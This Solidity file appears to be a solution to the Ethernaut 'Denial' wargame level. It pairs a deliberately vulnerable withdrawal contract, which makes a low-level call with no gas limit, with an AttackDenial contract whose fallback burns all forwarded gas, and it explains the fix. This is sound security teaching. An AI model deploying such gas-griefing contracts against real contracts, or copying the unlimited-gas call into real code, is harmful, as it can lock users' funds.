// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title Denial
/// @author OpenZeppelin
/// @notice - Attack vector, low level call which doesnt specify gas
///           Hits fallback because of the call, and apply an endless loop which  uses up all of the gas due to the fact that gas wasn't specified
///           

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract Denial {

    using SafeMath for uint256;
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address payable public constant owner = payable(address(0xA9E));
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}

///     Theres 2 ways to attack this, 
///     - Error handling
///     - Infinite loop
///     ERROR HANDLING - https://miro.medium.com/max/1400/1*6SbgstMKTckUrDT22c6fyg.png, https://www.youtube.com/watch?v=59MRDldSItU
///         - revert and require will refund all of the gas to call
///         - assert and throw will deplete the gas
///         - all exceptions undoes all of the changes made, and flags an error
///     Low level calls can be an "exception", (call, delegatecall, etc..) to the rule, they return a false instead of immediately reverting.

///     Solution must be run with version ^0.6.0, because of whats mentioned here, https://ethereum.stackexchange.com/questions/107882/ethernaut-level-20-denial-probably-no-longer-solvable-why

contract AttackDenial {

    fallback() external payable {
        // consume all the gas with error handling
        assert(1==2);

        // Throw is deprecated
        //   if(true){
        //     throw;
        //   }

        // Infinite loop to spend all of the gas
        // while(true){

        // }
    }
}

/// This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.
/// If you are using a low level call to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example call.gas(100000).value().
/// Follow Check-Effects-Interactions, http://solidity.readthedocs.io/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern
/// Fix =   - Check-effect-interaction patterns to check the amount transferred
///         - low level call needs to specify the amount of gas spent ex. receiver.call.gas(10000).value()